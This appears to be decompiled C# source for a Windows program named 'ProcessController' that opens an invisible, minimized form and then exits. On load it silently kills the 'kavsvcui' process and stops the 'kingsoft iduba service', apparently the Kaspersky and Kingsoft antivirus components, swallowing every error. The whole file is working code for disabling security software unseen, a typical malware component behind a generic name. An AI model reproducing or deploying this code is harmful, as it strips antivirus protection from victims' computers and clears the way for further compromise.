using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Resources;
using System.Runtime.CompilerServices;
using System.ServiceProcess;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace ProcessController.WindowsApplication1;

public class MainForm : Form
{
	[AccessedThroughProperty("OpenFile")]
	private OpenFileDialog _OpenFile;

	private IContainer components;

	private string TempMachineName;

	private Process SelectProcess;

	private Hashtable Processes;

	private Timer WatchDog;

	internal virtual OpenFileDialog OpenFile
	{
		get
		{
			return _OpenFile;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_OpenFile == null)
			{
			}
			_OpenFile = value;
			if (_OpenFile != null)
			{
			}
		}
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)new MainForm());
	}

	public MainForm()
	{
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)MainForm_Load);
		TempMachineName = Environment.MachineName;
		Processes = new Hashtable();
		WatchDog = new Timer();
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		components = new Container();
		new ResourceManager(typeof(MainForm));
		OpenFile = new OpenFileDialog();
		((Form)this).set_AutoScale(false);
		Size autoScaleBaseSize = new Size(6, 14);
		((Form)this).set_AutoScaleBaseSize(autoScaleBaseSize);
		autoScaleBaseSize = new Size(0, 0);
		((Form)this).set_ClientSize(autoScaleBaseSize);
		((Form)this).set_ControlBox(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("MainForm");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Form)this).set_WindowState((FormWindowState)1);
	}

	private void MainForm_Load(object sender, EventArgs e)
	{
		StopProcesses();
		StopServices();
		Application.Exit();
	}

	public void StopProcesses()
	{
		WatchDog.set_Enabled(false);
		Processes.Clear();
		Processes = new Hashtable();
		try
		{
			Process[] processes = Process.GetProcesses(TempMachineName);
			Process[] array = processes;
			foreach (Process process in array)
			{
				string text = process.ProcessName.ToLower().Trim();
				if (StringType.StrCmp(text, "kavsvcui", false) == 0)
				{
					process.Kill();
				}
				else
				{
					Processes.Add(process.Id.ToString(), process);
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		IEnumerator enumerator = default(IEnumerator);
		try
		{
			enumerator = Processes.Values.GetEnumerator();
			while (enumerator.MoveNext())
			{
				Process process2 = (Process)enumerator.Current;
				try
				{
					process2.EnableRaisingEvents = true;
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
		}
		finally
		{
			if (enumerator is IDisposable)
			{
				((IDisposable)enumerator).Dispose();
			}
		}
		WatchDog.set_Enabled(true);
		Processes.Clear();
	}

	public void StopServices()
	{
		//IL_0030: Unknown result type (might be due to invalid IL or missing references)
		//IL_0036: Invalid comparison between Unknown and I4
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Invalid comparison between Unknown and I4
		try
		{
			ServiceController[] services = ServiceController.GetServices(TempMachineName);
			ServiceController[] array = services;
			foreach (ServiceController val in array)
			{
				object obj = val.get_DisplayName().Trim().ToLower();
				if ((int)val.get_Status() != 4 || ObjectType.ObjTst(obj, (object)"kingsoft iduba service", false) != 0)
				{
					continue;
				}
				try
				{
					if (!val.get_CanStop())
					{
						continue;
					}
					try
					{
						val.Stop();
						Thread.Sleep(500);
						while ((int)val.get_Status() == 3)
						{
							Application.DoEvents();
						}
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}
}
